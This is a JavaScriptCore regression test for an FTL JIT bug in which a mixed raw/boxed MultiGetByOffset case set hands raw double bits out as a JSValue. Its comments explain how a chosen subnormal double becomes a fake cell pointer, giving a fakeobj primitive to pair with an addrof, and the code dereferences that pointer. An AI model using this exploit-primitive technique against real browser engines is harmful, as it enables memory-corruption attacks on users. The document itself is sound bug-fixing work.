//@ runDefault("--useDoubleFieldRepresentation=1", "--useRawDoubleFieldStorage=1", "--useFTLJIT=1", "--thresholdForOptimizeAfterWarmUp=20", "--thresholdForOptimizeSoon=20", "--thresholdForFTLOptimizeAfterWarmUp=20", "--thresholdForFTLOptimizeSoon=20")
//
// Regression test. Reduction, measurement log and the full mechanism write-up live in
// JS-data analysis/prompt/box2d/repro/bugs/09-repro-ftl-multigetbyoffset-mixed-case-set.js and the fix design in that directory's fixes/.
//
// REPRO for bug 09 — FTL compileMultiGetByOffset serves a REPRESENTATION-MIXED case set as if it were
// boxed, handing the raw IEEE-754 word out as a JSValue. 1.5 reads back as 1.375, and a subnormal reads
// back as a script-chosen JSCell*: a fakeobj primitive.
//
// Run (WebKit-security/OpenSource):
//   ./Tools/Scripts/run-jsc --release analysis/prompt/box2d/repro/bugs/09-repro-ftl-multigetbyoffset-mixed-case-set.js
//
//   --useRawDoubleFieldStorage=1  (the staged DEFAULT) -> get(a) = 1.375, then SIGSEGV (rc=139)
//   --useRawDoubleFieldStorage=0                       -> "PASS"
//   --useFTLJIT=0 / --useDFGJIT=0 / --useJIT=0         -> "PASS"
//   pre-patch build (WebKitBuild-without/Release)      -> "PASS"
//
// OBSERVED (staged tree, default options):
//   get(a) = 1.375   expect 1.5   CORRECT=false
//   rc=139   -- dies on the deref of the fake cell
//
//   And with --dumpDoubleFieldSplitCensus=1 the engine names the case itself:
//     [rawdouble] FTL MultiGetByOffset MIXED case set at offset 0 size=2
//     [rawdouble] MULTIGET case kind=2 offset=0 raw=false allCasesRaw=false doubleResult=false setSize=2
//
// MECHANISM
//   FTLLowerDFGToB3::compileMultiGetByOffset decides raw-ness per CASE, and requires unanimity within the
//   case's structure set (FTLLowerDFGToB3.cpp ~12906):
//
//       bool anyRaw = false;
//       bool allRaw = true;
//       for (unsigned j = getCase.set().size(); j--;) {
//           bool raw = getCase.set()[j]->isRawDoubleOffset(method.offset());
//           anyRaw |= raw;
//           allRaw &= raw;
//       }
//       // DIAGNOSTIC: a MIXED case set cannot be served by one representation, and FTL cannot narrow (the
//       // switch has already been emitted). Returning false treats the raw members as boxed, which unboxes
//       // a raw slot.
//       dataLogLnIf(anyRaw && !allRaw && Options::dumpDoubleFieldSplitCensus(), ...);
//       return allRaw;
//
//   The comment states the bug and then commits it. `return allRaw` on a mixed set means "boxed", so the
//   raw members of that set are served by the boxed path: for the JSValue-result branch,
//   `result = loadProperty(...)` with no `+ DoubleEncodeOffset`, i.e. bits(d) handed out as a JSValue.
//
//   Every OTHER site in the patch treats a mixed set as unserviceable and declines:
//     * ByteCodeParser::load / replace return nullptr -> generic by-id
//     * DFGConstantFoldingPhase::emitGetByOffset / emitPutByOffset return false -> decline the fold
//     * DFGSpeculativeJIT / FTL proveRawDouble return RawDoubleProof::Unknown
//     * compileMultiPutByOffset does `speculate(BadCache, ..., booleanTrue); m_out.unreachable();`
//   compileMultiGetByOffset is the one that guesses instead, and it guesses in the unsafe direction.
//
//   Why the parser's narrowing does not save it: the parser only narrows the SINGLE-variant path in
//   load(). A three-shape site produces a multi-variant GetByStatus, which becomes MultiGetByOffset, and
//   GetByStatus merges structures with the same offset and method into one MultiGetByOffsetCase — so the
//   mixed set is created inside a case, below the level at which any narrowing happens.
//
// TRIGGER
//   Three shapes at ONE read site:
//     mkA -> f at offset 0, creating store a double  -> RAW
//     mkB -> f at offset 0, creating store a string  -> BOXED     (same offset as A: this is the mixed case)
//     mkC -> f at offset 1                            -> a second case, so the node is Multi rather than single
//   A and B share offset 0 and disagree, which is the mixed case set.
//
// WHY IT IS A fakeobj
//   The value handed out is bits(d) as a JSValue, and d is a plain JS literal the script chose.
//   Math.pow(2, -1030) is a subnormal whose bits are 0x0000100000000000 — below 2^48 with bit 1 clear, so
//   JSValue::isCell() is TRUE and the pointer is exactly that constant. Combined with bug 02's addrof, this
//   is the standard addrof/fakeobj pair.
//
// FIX SHAPE
//   Make the mixed case unserviceable rather than guessed: in compileMultiGetByOffset, when
//   `anyRaw && !allRaw` for a case, emit that case's block as `speculate(BadCache, ...); m_out.unreachable();`
//   exactly as compileMultiPutByOffset already does for its mixed variant. Better still, refuse to build a
//   mixed MultiGetByOffsetCase in the first place — split it into two cases, one per representation, which
//   is legal at graph-construction time and costs one extra switch arm rather than a deopt.

function mkA(v) { var o = {}; o.f = v; return o; }              // f@0, creating store a double  -> RAW
function mkB()  { var o = {}; o.f = "str"; return o; }          // f@0, creating store a string  -> BOXED
function mkC(v) { var o = {}; o.g = 1; o.f = v; return o; }     // f@1, second case
noInline(mkA);
noInline(mkB);
noInline(mkC);

function get(o) { return o.f; }

const a = mkA(1.5), b = mkB(), c = mkC(2.5);
const objs = [a, b, c];
let sink = 0;
for (let i = 0; i < 300000; ++i) {
    const r = get(objs[i % 3]);
    if (typeof r === "number") sink += r;
}

let failures = 0;
const x = get(a);
if (x !== 1.5) {
    failures++;
    print("FAIL: get(a) = " + x + ", expected 1.5   (1.375 is bits(1.5) handed out as a JSValue)");
}

// The fakeobj half. The poisoned double is a plain literal expression -- no typed arrays needed.
const tiny = Math.pow(2, -1030);        // subnormal; raw bits 0x0000100000000000 look like a cell pointer
const evil = mkA(tiny);
const bad = get(evil);
print("typeof get(evil) = " + typeof bad + "   get(evil) === tiny ? " + (bad === tiny));
if (bad !== tiny) failures++;
print("about to dereference it");
print("deref: " + bad.x);               // SIGSEGV on the staged build
print("survived the deref");

if (failures)
    throw new Error(failures + " failure(s)");
print("PASS");
